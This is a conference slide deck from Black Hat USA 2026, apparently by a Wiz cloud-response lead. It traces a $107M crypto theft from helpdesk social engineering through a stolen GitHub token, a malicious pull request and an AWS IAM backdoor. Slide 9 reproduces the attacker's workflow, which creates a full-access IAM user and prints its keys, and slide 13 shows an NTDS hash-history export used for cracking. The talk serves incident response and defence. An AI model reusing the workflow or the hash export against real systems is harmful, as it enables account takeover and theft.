---
title: "The Crypto Caper Exposing a Sophisticated Multi-Cloud Bandit"
speakers: ["Yotam Meitar"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Yotam Meitar_The Crypto Caper Exposing a Sophisticated Multi-Cloud Bandit.pdf"
pages: 16
sha256: "d72544828b7bba5c5fcad250e9b8a6827069e1c61bc2f93d8bc0819029486078"
text_chars: 4368
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
ocr_confidence: null
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 15
vision_verified_pages: 16
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T05:47:43Z"
---
# The Crypto Caper Exposing a Sophisticated Multi-Cloud Bandit

**Speakers:** Yotam Meitar  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Yotam Meitar_The Crypto Caper Exposing a Sophisticated Multi-Cloud Bandit.pdf` (16 pages)


## Slide 1

The Crypto Caper: Exposing a Sophisticated Multi-Cloud Bandit

**Whoami**  
Yotam Meitar  
Director of Cloud Response  
yotam.meitar@wiz.io

## Slide 2

# The Victim

Manual auth for any transaction over $1M

Customer Request → Entra Authentification → KYC and authorization server → Hot Wallet transaction server → BitGo final transaction validation → Customer Wallet

$80M Transaction

## Slide 3

# Initial Triage

What we know:

Lost funds: $80M

Attack timespan: 1 day

Compromised:

Entra Users: 1

Manual auth for any transaction over $1M

Customer Request → Entra Authentification → KYC and authorization server → Hot Wallet transaction server → BitGo final transaction validation → Customer Wallet

| isBitGoAdminAction | ip | user | coin |
| --- | --- | --- | --- |
| True | Transaction Server IP | Victim Admin | |

## Slide 4

# The Approver

What we know:

Lost funds: $80M

Attack timespan: 1 day

Compromised:

Entra Users: 1

| Activity | Status | Status Reason | Initiated by (actor) | Target(s) |
| --- | --- | --- | --- | --- |
| Change password (self-service) | Success | None | Victim Admin | Victim Admin |
| Reset password (by admin) | Success | Successfully completed reset. | Helpdesk User | Victim Admin |

Social Engineering → Major Transaction

## Slide 5

# Blockchain Investigation

What we know:

Lost funds: ~~$80M~~ $107M

Attack timespan: ~~1 day~~ 7 Months

Compromised:

Entra Users: 1

Company Hot Wallet → New Unknown Wallet → New Unknown Wallet → Automated Exchange Wallet

Smaller Transactions → Social Engineering → Major Transaction

## Slide 6

# AWS - The Transactions

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 1

AWS IAM Users: 1

| Time | Event | Principal | Resource | Principal IP | Origin |
| --- | --- | --- | --- | --- | --- |
| 2:06:34 P... | SendCommand | secops | transactions-server | | AWS CloudTrail Events |
| 1:59:37 PM | SendCommand | secops | transactions-server | | AWS CloudTrail Events |
| 1:53:11 PM | StartSession | secops | transactions-server | | AWS CloudTrail Events |

```
[{"id":"0.aws:runShellScript","runCommand":["cat /opt/crypto-engine/scripts/initiate_transaction.sh |
```

AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 7

# AWS - The User

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 1

AWS IAM Users: ~~1~~ 2

7 Months Earlier

Principal (redacted, annotated): Victim Test User

| Time | Event | Principal | Resource | Principal IP | Origin |
| --- | --- | --- | --- | --- | --- |
| 11:00:19 AM | CreateInvalidation |  |  | 68.154.119.215 | AWS CloudTrail Events |
| 11:00:16 AM | GetCallerIdentity |  |  | 68.154.119.215 | AWS CloudTrail Events |
| 11:00:00 AM | PutObject (3) |  |  | 68.154.119.215 | AWS S3 Data Events |
| 11:00:00 AM | ListObjects |  |  | 68.154.119.215 | AWS S3 Data Events |
| 10:54:50 AM | CreateAccessKey |  | secops | 40.79.245.21 | AWS CloudTrail Events |
| 10:54:49 AM | AttachUserPolicy |  | secops | 40.79.245.21 | AWS CloudTrail Events |
| 10:54:48 AM | AttachUserPolicy |  | secops | 40.79.245.21 | AWS CloudTrail Events |
| 10:54:47 AM | AttachUserPolicy |  | secops | 40.79.245.21 | AWS CloudTrail Events |
| 10:54:47 AM | CreateUser |  | secops | 40.79.245.21 | AWS CloudTrail Events |
| 10:54:45 AM | GetCallerIdentity |  |  | 40.79.245.21 | AWS CloudTrail Events |
| 10:50:23 AM | CreateInvalidation |  |  | 52.159.227.195 | AWS CloudTrail Events |
| 10:50:20 AM | GetCallerIdentity |  |  | 52.159.227.195 | AWS CloudTrail Events |
| 10:50:00 AM | PutObject |  |  | 52.159.227.195 | AWS S3 Data Events |
| 10:50:00 AM | PutObject (2) |  |  | 52.159.227.195 | AWS S3 Data Events |
| 10:50:00 AM | ListObjects |  |  | 52.159.227.195 | AWS S3 Data Events |
| 10:34:33 AM | CreateInvalidation |  |  | 20.49.13.181 | AWS CloudTrail Events |
| 10:34:30 AM | GetCallerIdentity |  |  | 20.49.13.181 | AWS CloudTrail Events |
| 10:34:00 AM | ListObjects |  |  | 20.49.13.181 | AWS S3 Data Events |
| 10:34:00 AM | PutObject (3) |  |  | 20.49.13.181 | AWS S3 Data Events |
| 10:15:50 AM | CreateInvalidation |  |  | 20.169.50.34 | AWS CloudTrail Events |

AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 8

# Github - The Action

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 1

AWS IAM Users: 2

Git Repos: 1

```
provision-user
succeeded [redacted] ago in 9s

Set up job

Configure AWS Credentials
1  ▶ Run aws-actions/configure-aws-credentials@v4
8  Proceeding with IAM user credentials

Create User and Attach Policy
1  ▶ Run aws iam create-user --user-name secops
10 {
11     "User": {
12         "Path": "/",
13         "UserName": "secops",
14         "UserId": "[redacted]",
15         "Arn": "arn:aws:iam:[redacted]user/secops",
16         "CreateDate": "[redacted]18:33+00:00"
17     }
18 }

Generate and Print Access Keys
1  ▶ Run KEYS=$(aws iam create-access-key --user-name secops --output json)
11 Access Key ID: [redacted]
12 Secret Access Key: [redacted]
```

Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 9

# Github - The Pull Request

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 1

AWS IAM Users: 2

Git Repos: 1

secops #16

Closed | [redacted] wants to merge 3 commits into main from bugfix/secops

Conversation 2 | Commits 3 | Checks 11 | Files changed 1

28 .github/workflows/secops-workflow.yml

@@ -0,0 +1,28 @@

```diff
+ name: Setup SecOps User
+ on:
+   pull_request:
+     types: [opened, synchronize]
+ 
+ jobs:
+   provision-user:
+     runs-on: ubuntu-latest
+     steps:
+       - name: Configure AWS Credentials
+         uses: aws-actions/configure-aws-credentials@v4
+         with:
+           aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY }}
+           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+           aws-region: us-east-1
+ 
+       - name: Create User and Attach Policies
+         run: |
+           aws iam create-user --user-name secops || true
+           aws iam attach-user-policy --user-name secops --policy-arn arn:aws:iam::aws:policy/AmazonSSMFullAccess
+           aws iam attach-user-policy --user-name secops --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess
+           aws iam attach-user-policy --user-name secops --policy-arn arn:aws:iam::aws:policy/IAMFullAccess
+ 
+       - name: Generate and Print Access Keys
+         run: |
+           KEYS=$(aws iam create-access-key --user-name secops --output json)
+           echo "Access Key ID: $(echo $KEYS | jq -r '.AccessKey.AccessKeyId')"
+           echo "Secret Access Key: $(echo $KEYS | jq -r '.AccessKey.SecretAccessKey')"
```

Github PR → Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 10

# Github - The PAT

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 1

AWS IAM Users: 2

Git Repos: 1

Git Users: 1

Principal (redacted, annotated): Victim Developer

| Time | Event | Principal | Resource | Principal IP | Origin |
| --- | --- | --- | --- | --- | --- |
| 11:18:38 AM | workflows.completed_workflow_run | | prod/prod-crypto-… | - | GitHub Audit Logs |
| 11:18:24 AM | workflows.created_workflow_run | | prod/prod-crypto-… | | GitHub Audit Logs |
| 11:18:20 AM | pull_request.create | | | | GitHub Audit Logs |

Github PAT → Github PR → Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 11

# Password Manager

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: ~~1~~ 2

AWS IAM Users: 2

Git Repos: 1

Git Users: 1

| timestamp | used_version | vault_uuid | item_uuid | action | user | client |
| --- | --- | --- | --- | --- | --- | --- |
| [redacted]15:31.935 | 4 | 5tq6s… | w3zksr4… (annotated: PAT) | reveal | { "email": …, "name": …, "uuid": … } (Victim Developer) | { "app_name": "1Password CLI", "app_version": "2320003", "ip_address": …, "os_name": "MacOSX", "os_version": "26.2", … } |

| timestamp | category | type | country | details | target_user | client |
| --- | --- | --- | --- | --- | --- | --- |
| [redacted]:41:21.96 | success | credentials_ok | United States | null | { "email": …, "name": …, "uuid": … } (Victim Developer (Entra)) | { "app_name": "1Password CLI", "app_version": "2300301", "ip_address": …, "os_name": "MacOSX", "os_version": "26.2", … } |

1Password → Github PAT → Github PR → Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 12

# The Password Mess

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 2

AWS IAM Users: 2

Git Repos: 1

Git Users: 1

ADAudit Plus

Dashboard | Active Directory | Cloud Directory | File Audit | Server Audit | Endpoint | AD Backup | Analytics | Alerts | Configuration | Admin | Support

User Behaviour Analytics | Risk Assessment | Custom Report | Aggregate Reports

Report Configuration | My Reports | User passwords | Frequently Viewed Reports

User passwords in [redacted]
(From [redacted])

Period | Hours: All

User passwords

Advanced Search

| USER NAME | EVENT NUMBER | DOMAIN | CALLER USER NAME | WHEN | REMARKS | EVENT TYPE |
| --- | --- | --- | --- | --- | --- | --- |
| Victim Developer | 4723 | | | 08:13:09 AM | Change Password Attempt | Success |
| | 4724 | | | 08:12:24 AM | User Account password set | Success |
| | 4724 | | | 08:12:13 AM | User Account password set | Failure |
| | 4723 | | | 11:29:41 PM | Change Password Attempt | Success |
| | 4724 | | | 11:29:02 PM | User Account password set | Success |
| | 4723 | | | 06:20:15 PM | Change Password Attempt | Success |

1Password → Github PAT → Github PR → Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 13

# Password Cracking

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 2

AWS IAM Users: 2

Git Repos: 1

Git Users: 1

```
PS [redacted] Get-ADDBAccount -SamAccountName [redacted] -DBPath '[redacted]ntds.dit' -ExportFormat HashcatNTHistory -BootKey $key
[redacted]26
[redacted]da72791b439
[redacted]2a7f62c614a
[redacted]ff7491d346f
[redacted]e8becb39215
[redacted]659263a31a5
[redacted]4d87253efe5
[redacted]b8dd7a59467
[redacted]786191f0ab4
[redacted]f665d3e36b8
[redacted]81c9c0bec79
[redacted]630a14d0ecbe
[redacted]ae307ebc8945
[redacted]a98df2d7866b
[redacted]e9b0c0eda308
[redacted]4c7beec76d8e
[redacted]cb6a83a3d15f
```

Cracked-password annotations overlaid on the hash history (top to bottom):

- [redacted]e8becb39215 — Pattern %%
- [redacted]659263a31a5 — Summer 2025!!!
- [redacted]4d87253efe5 — NO MATCH
- [redacted]b8dd7a59467 — Summer 2025!!
- [redacted]786191f0ab4 — Pattern @@

Social Engineering → 1Password → Github PAT → Github PR → Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 14

# Helpdesk, A Third Time

What we know:

Lost funds: $107M

Attack timespan: 7 months

Compromised:

Entra Users: 2

AWS IAM Users: 2

Git Repos: 1

Git Users: 1

Social Engineering → Social Engineering → 1Password → Github PAT → Github PR → Github Actions → AWS IAM → AWS SSM → AWS EC2 → Smaller Transactions → Social Engineering → Major Transaction

## Slide 15

# Key Takeaways

Cloud-specific attacks require cloud-specific defenses

Rapid risk remediation is a must in the cloud

Centralized visibility

## Slide 16

THANK YOU
